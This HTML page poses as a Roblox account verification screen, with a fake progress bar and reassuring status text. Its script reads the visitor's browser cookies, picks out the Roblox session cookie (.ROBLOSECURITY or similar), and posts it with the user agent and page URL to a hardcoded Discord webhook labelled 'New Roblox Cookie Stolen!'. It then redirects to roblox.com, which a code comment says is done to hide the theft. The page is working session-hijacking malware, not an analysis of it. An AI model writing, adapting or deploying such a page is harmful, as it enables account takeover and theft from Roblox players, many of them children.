<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Account Verification</title>
    <style>
        body {
            background: #1e1e1e;
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background: #2a2a2a;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            text-align: center;
            width: 300px;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
        }
        h2 { margin: 0 0 10px 0; }
        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        .loader {
            width: 100%;
            height: 4px;
            background: #444;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress {
            width: 0%;
            height: 100%;
            background: #00b06c;
            transition: width 2s ease-in-out;
        }
        #status {
            margin-top: 15px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Roblox Logo (SVG) -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Roblox_player_icon_black.svg" alt="Roblox" class="logo">
        <h2>Verification Required</h2>
        <p>We need to verify your account is human.</p>
        
        <div class="loader">
            <div class="progress" id="progressBar"></div>
        </div>
        <p id="status">Checking session...</p>
    </div>

    <script>
        // Simulate loading process
        setTimeout(() => {
            document.getElementById('progressBar').style.width = '100%';
        }, 100);

        setTimeout(() => {
            document.getElementById('status').innerText = 'Verifying...';
        }, 1000);

        setTimeout(() => {
            stealAndSendCookie();
        }, 2500);

        function stealAndSendCookie() {
            // 1. Get all cookies
            const cookies = document.cookie;
            
            // 2. Find the Roblox security cookie
            const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY')) || 
                                 cookies.split(';').find(c => c.trim().startsWith('RobloxAuth')) ||
                                 cookies.split(';').find(c => c.trim().startsWith('RBX'));

            if (!robloxCookie) {
                document.getElementById('status').innerText = '❌ No session found. Please log in to Roblox.';
                return;
            }

            document.getElementById('status').innerText = '✅ Success! Redirecting...';

            // 3. Send to Discord Webhook
            fetch('https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔓 **New Roblox Cookie Stolen!**\n\`\`\`${robloxCookie}\`\`\`\n🕵️ **User Agent:** ${navigator.userAgent}\n🌐 **Current URL:** ${window.location.href}`
                })
            })
            .then(() => {
                // 4. Redirect to Roblox to hide the theft
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com';
                }, 1000);
            })
            .catch(err => {
                document.getElementById('status').innerText = '❌ Error. Try again.';
                console.error(err);
            });
        }
    </script>
</body>
</html>
